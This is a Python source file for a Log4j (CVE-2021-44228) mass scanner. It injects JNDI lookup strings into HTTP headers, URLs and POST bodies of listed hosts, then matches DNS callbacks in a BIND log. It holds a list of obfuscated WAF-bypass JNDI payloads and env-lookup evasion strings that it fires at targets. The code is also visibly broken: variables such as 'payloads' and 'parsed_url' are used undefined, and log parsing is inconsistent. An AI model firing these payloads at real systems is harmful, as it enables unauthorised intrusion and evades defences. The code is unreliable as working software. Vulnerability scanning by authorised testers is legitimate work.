#!/usr/bin/env python3
# coding=utf-8
# ******************************************************************
# lhrafna.py: A generic scanner for log4j RCE CVE-2021-44228
#
# based on log4j-scanner by FullHunt.io https://github.com/fullhunt/log4j-scan
# but with utilizing your own DNS-server and modified scanning.engine
#
# ******************************************************************

this_version = "0.4 2021-12-22"

import argparse
import random
import requests
import time
import sys
from urllib import parse as urlparse
import base64
import json
import random
import yaml
import os 
import hashlib 
import socket
import shutil
import glob 

from uuid import uuid4
from base64 import b64encode
from termcolor import cprint
from jinja2 import Template



# ~ from Crypto.Cipher import AES, PKCS1_OAEP
# ~ from Crypto.PublicKey import RSA
# ~ from Crypto.Hash import SHA256

sys.path.append("libs")

from helpers import *

headers_file = "libs/headers.txt"

# Disable SSL warnings
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass



if len(sys.argv) <= 1:
    print('\n%s -h for help.' % (sys.argv[0]))
    exit(0)


default_headers = {
    'User-Agent': 'log4j-scan (https://github.com/mazen160/log4j-scan)',
    # 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
    'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers
}
post_data_parameters = ["username", "user", "email", "email_address", "password"]
timeout = 2
waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
                       "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
                       "${jndi:rmi://{{callback_host}}}",
                       "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
                       "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host/{{random}}}",
                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
                       "${jndi:dns://{{callback_host}}}"]

# ~ parser = argparse.ArgumentParser()
# ~ parser.add_argument("-u", "--url",
                    # ~ dest="url",
                    # ~ help="Check a single URL.",
                    # ~ action='store')
# ~ parser.add_argument("-l", "--list",
                    # ~ dest="usedlist",
                    # ~ help="Check a list of URLs.",
                    # ~ action='store')
# ~ parser.add_argument("--request-type",
                    # ~ dest="request_type",
                    # ~ help="Request Type: (get, post) - [Default: get].",
                    # ~ default="get",
                    # ~ action='store')
# ~ parser.add_argument("--headers-file",
                    # ~ dest="headers_file",
                    # ~ help="Headers fuzzing list - [default: headers.txt].",
                    # ~ default="headers.txt",
                    # ~ action='store')
# ~ parser.add_argument("--run-all-tests",
                    # ~ dest="run_all_tests",
                    # ~ help="Run all available tests on each URL.",
                    # ~ action='store_true')
# ~ parser.add_argument("--exclude-user-agent-fuzzing",
                    # ~ dest="exclude_user_agent_fuzzing",
                    # ~ help="Exclude User-Agent header from fuzzing - useful to bypass weak checks on User-Agents.",
                    # ~ action='store_true')
# ~ parser.add_argument("--wait-time",
                    # ~ dest="wait_time",
                    # ~ help="Wait time after all URLs are processed (in seconds) - [Default: 5].",
                    # ~ default=5,
                    # ~ type=int,
                    # ~ action='store')
# ~ parser.add_argument("--waf-bypass",
                    # ~ dest="waf_bypass_payloads",
                    # ~ help="Extend scans with WAF bypass payloads.",
                    # ~ action='store_true')
# ~ parser.add_argument("--dns-callback-provider",
                    # ~ dest="dns_callback_provider",
                    # ~ help="DNS Callback provider (Options: dnslog.cn, interact.sh) - [Default: interact.sh].",
                    # ~ default="interact.sh",
                    # ~ action='store')
# ~ parser.add_argument("--custom-dns-callback-host",
                    # ~ dest="custom_dns_callback_host",
                    # ~ help="Custom DNS Callback Host.",
                    # ~ action='store')

# ~ args = parser.parse_args()


def get_fuzzing_headers(payload):
    fuzzing_headers = {}
    fuzzing_headers.update(default_headers)
    with open(headers_file, "r") as f:
        for i in f.readlines():
            i = i.strip()
            if i == "" or i.startswith("#"):
                continue
            fuzzing_headers.update({i: payload})

    fuzzing_headers["Referer"] = f'https://{fuzzing_headers["Referer"]}'
    return fuzzing_headers

def get_custom_payloads(app):
  payloads_dir = "payloads"
  payloads = {}
  if app == "all":
    payload_list = glob.glob("%s/*.yaml" % payloads_dir)
  else:
    payload_list = glob.glob("%s/%s.yaml" % (payloads_dir, app))
  
  for pl in payload_list:
    with open(pl, "r") as py:
      try:
        payload_yaml = yaml.safe_load(py)
      except yaml.YAMLError as exc:
        print(exc)
        sys.exit(2)
    payload_name = pl.split("/")[-1].split(".")[0]
    if "url" in payload_yaml:
      payload_url = payload_yaml["url"]
    else:
      payload_url = "/"
      
    payload_headers = []
    if "headers" in payload_yaml:
      for header in payload_yaml["headers"]:
        payload_headers.append(header)
    
    payloads[payload_name] = { "url": payload_url, "headers": payload_headers }
    if "method" in payload_yaml:
      payload_method = payload_yaml["method"]
    else:
      payload_method = "GET"

    if "data" in payload_yaml:
      payload_data = payload_yaml["data"]
    else:
      payload_data = ""


    payloads[payload_name] = { 
    
        "url": payload_url, 
        "headers": payload_headers, 
        "method":  payload_method, 
        "data": payload_data, 
        
      }
  
  return(payloads)
    

def get_fuzzing_post_data(payload):
    fuzzing_post_data = {}
    for i in post_data_parameters:
        fuzzing_post_data.update({i: payload})
    return fuzzing_post_data


def generate_waf_bypass_payloads(callback_host, random_string):
    payloads = []
    for i in waf_bypass_payloads:
        new_payload = i.replace("{{callback_host}}", callback_host)
        new_payload = new_payload.replace("{{random}}", random_string)
        payloads.append(new_payload)
    return payloads


def parse_url(url):
    """
    Parses the URL.
    """

    # Url: https://example.com/login.jsp
    url = url.replace('#', '%23')
    url = url.replace(' ', '%20')

    if ('://' not in url):
        url = str("http://") + str(url)
    scheme = urlparse.urlparse(url).scheme

    # FilePath: /login.jsp
    file_path = urlparse.urlparse(url).path
    if (file_path == ''):
        file_path = '/'

    return({"scheme": scheme,
            "site": f"{scheme}://{urlparse.urlparse(url).netloc}",
            "host":  urlparse.urlparse(url).netloc.split(":")[0],
            "file_path": file_path})


def scan_host(host_cx):

    record_out = "%s/global.log" % scan_output
    ts = int(time.time())
    if not os.path.isfile(record_out):
      with open(record_out, "a") as r_o:
        r_o.write("# init %s | %s " % ( time.ctime(), ts))
    
    recorded = []
    with open(record_out, "r") as r_o:
      for line in r_o:
        line = line.strip()
        if line.startswith("#"):
          continue
        rts, host, host_id, date, payload = line.split(",")
        recorded.append(host_id.strip())
        try:
          rts, host, host_id, date = line.split(",")
        except:
          continue
          



    

    payloads_from_definitions = get_custom_payloads(scan_mode)
    
    
    if waf_bypass:
        payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
    for payload in payloads_from_definitions:
      pl_data = payloads_from_definitions[payload]
      

      # ~ pg("\n---[ %s ]--------\n" % payload)
      # ~ pm(pl_data)
      
      
      #parsed_url = parse_url(url)
      random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
      #payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
      host_id_raw = host_cx + scan_id + payload
      host_id = "%s.%s" % (hashlib.sha224(host_id_raw.encode('utf-8')).hexdigest()[0:12], scan_id)
      host_payload = "%s.%s" % (host_id, base_scan_domain)
      #check if already checked
      if host_id in recorded:
        cprint(f"[i] already checked URL: {host_cx} | PAYLOAD: {host_payload}", "yellow")
        return() 
      # ~ remote_pi = socket.gethostbyname(host_payload)
      ts = int(time.time())
      
      #
      # https://twitter.com/marcioalm/status/1471740771581652995
      jndi_payload = '${${env:BARFUX:-j}${env:BARFIX:-n}di${env:BARFAX:-:}ld${env:BARFEX:-a}p${env:BARFYX:-:}//127.0.0.1#%s/%s}' % (host_payload, random_string)


      # generating now payload herader/url - payload based on template
      if payload in ("solr", "global-protect"):
        pl_url = "%s%s" % (host_cx, Template(pl_data["url"]).render(PAYLOAD = host_payload))
      else:
        pl_url = "%s%s" % (host_cx, Template(pl_data["url"]).render(PAYLOAD = jndi_payload))
      
      pl_headers = {}
      
      for h in pl_data["headers"]:
        h_v = h.split(":")[0].strip()
        h_k = Template(h.split(":")[1].strip()).render(PAYLOAD = jndi_payload)
        pl_headers[h_v] = h_k
      
      payloads = []
      for proto in ["ldap", "rmi", "dns", "iiop"]:
        # make this working in v0.5
        jndi_payload = '${${env:BARFOX:-j}${env:BARFOX:-n}di${env:BARFOX:-:}ld${env:BARFOX:-a}p${env:BARFOX:-:}//127.0.0.1#%s/%s}' % (host_payload, random_string)
        payloads.append(jndi_payload)
      # ~ print(payload)
      # ~ payloads = [payload]
  
      # now record my call 
      with open(record_out, "a") as r_a:
        r_a.write("%s, %s, %s, %s, %s\n" % (ts, host_cx, host_id, time.ctime(), payload ))
        # ~ cprint(f"[*] scanURL: {url} | PAYLOAD: {host_payload}", "cyan")
        
        cprint(f"[*] URL: %-30s | %-16s | PAYLOAD: %s" % (host_cx, payload, host_payload), "cyan")
        # ~ pg(pl_url)
        # ~ pg(pl_headers)
        if pl_data["method"]  == "GET":
          try:
            status = requests.get(pl_url, headers=pl_headers, verify=False, timeout=timeout)
            pg(status.status_code)
          except Exception as e:
            pass
            cprint(f"EXCEPTION: {e}")
        elif pl_data["method"]  == "POST":
          data = Template(pl_data["data"]).render(PAYLOAD = host_payload)

          try:
            status = requests.post(pl_url, headers=pl_headers, data = data, verify=False, timeout=timeout)
            pg(status.status_code)
          except:
            pr("error in POSTing to %s" % pl_url)
            pass
            


def main_scan():
    urls = []
    with open(url_list, "r") as f:
      for i in f.readlines():
        i = i.strip()
        if i == "" or i.startswith("#"):
          continue
        urls.append(i)


    cprint("[%] Checking for Log4j RCE CVE-2021-44228.", "magenta")
    for host in urls:
      scan_host(host)

    cprint("[*] Payloads sent to all URLs. Waiting for DNS OOB callbacks.", "cyan")
    cprint("[*] go grab a coffe and check results with", "cyan")
    cprint("    ./hrafna.py report %s " % scan_config, "cyan")


def main_report():

    record_out = "%s/global.log" % scan_output
    matched_csv = "%s/%s-matched.csv" % (scan_output, scan_name)
    
    ts = int(time.time())
    if not os.path.isfile(record_out):
      with open(record_out, "a") as r_o:
        r_o.write("# init %s | %s " % ( time.ctime(), ts))
    
    # reading in all the recorded scans
    recorded = []
    recorded_dict = {}
    
    with open(record_out, "r") as r_o:
      for line in r_o:
        line = line.strip()
        if line.startswith("#"):
          continue
        rts, host, host_id, date, payload = line.split(",")
        recorded_dict[host_id.strip()] = { "ts": rts.strip(), "host": host.strip(), "date": date.strip(), "payload": payload}

    #reading in the bind.log
    bind_dict = {}
    with open(bind_log, "r") as b_l:
      for line in b_l:
        line = line.strip()
        linex = line.split(" ")
        lineq = line.split("query:")[1].split("IN")[0].strip()
        date = "%s %s" % (linex[0], linex[1].split(".")[0])
        host_ip = linex[4].split("#")[0].strip()
        host_id = lineq.split(".%s" % base_scan_domain)[0]
        bind_dict[host_id] = { "host": host_ip, "date": date }
    
    # comparing
    
    # ~ print(bind_dict)
    
    with open(matched_csv, "w") as mo:
      mo.write("ScanDate, CallbackDate, ScannedHost, CallbackHost, ScanType, Designator \n")
      
    
      for hid in recorded_dict:
        # ~ print(hid)
        for bid in bind_dict:
          if bid.find(hid) > -1:
            cprint("[!] MATCH %s | %s | %s" % (bind_dict[bid]["host"], recorded_dict[hid]["host"], bind_dict[bid]["date"] ), "red")
            mo.write("%s, %s, %s, %s, %s, %s \n" % (time.strftime("%d-%b-%Y %H:%M", time.localtime(float(recorded_dict[hid]["ts"]))),  bind_dict[bid]["date"] , recorded_dict[hid]["host"].split("://")[1].split(":")[0], bind_dict[bid]["host"], recorded_dict[hid]["payload"], hid))
            
          else:
            continue
            #cprint("[+] OK    %s " % (recorded_dict[hid]["host"] ), "green")
    
    
    


  

if __name__ == "__main__":


  

  # loading global_vars

  with open("global.yaml", "r") as global_y:
    try:
      global_yaml = yaml.safe_load(global_y)
    except yaml.YAMLError as exc:
      print(exc)
      sys.exit(2)
  
  base_scan_domain = global_yaml["base_scan_domain"]
  bind_log = global_yaml["bind_log"]
  
  try:
    global_out =  global_yaml["global_output"]
  except:
    global_out =  "output"
    


  mode = sys.argv[1]
  scan_config = sys.argv[2]
  with open(scan_config, "r") as yaml_stream:
    try:
      scan_yaml = yaml.safe_load(yaml_stream)
    except yaml.YAMLError as exc:
      print(exc)
      sys.exit(2)

  # nao we can haz welcome
  
  welcome(this_version, mode)


  url_list = scan_yaml["input_file"]
  if not os.path.isfile(url_list):
    cprint("[-] input_file not exists: %s " % ( url_list ), "red")
    print(scan_yaml)
    sys.exit(2)
  scan_mode = scan_yaml["mode"]
  scan_name = scan_yaml["name"].replace(" ", "_")
  scan_id = hashlib.sha512(scan_name.encode('utf-8')).hexdigest()[0:6]
  
  waf_bypass = False 
  
  if "waf_bypass" in scan_yaml:
    waf_bypass = True
    
  scan_output = "%s/%s" % (global_out, scan_name)
    
  if mode == "scan":
    if not os.path.isdir(scan_output):
      os.makedirs(scan_output)
    
    main_scan()

  elif mode == "report":

    main_report()
  
  elif mode == "reset":
    naotime = int(time.time())
    output_reset = "%s/%s.%s" % (global_out, scan_name, naotime)
    if os.path.isdir(scan_output):
      shutil.move(scan_output, output_reset)
      cprint("[+] cleaned %s | %s -> %s" % (scan_name, scan_output, output_reset))
    else:
      cprint("[i] nothing to clean %s | %s " % (scan_name, scan_output))
      
    
  try:

    mode = sys.argv[1]
    scan_config = sys.argv[2]
    scan_yaml = yaml.safe_load(scan_config)


  except KeyboardInterrupt:
    print("\nKeyboardInterrupt Detected.")
    print("Exiting...")
    exit(0)
  except:
    usage()
    sys.exit()
  
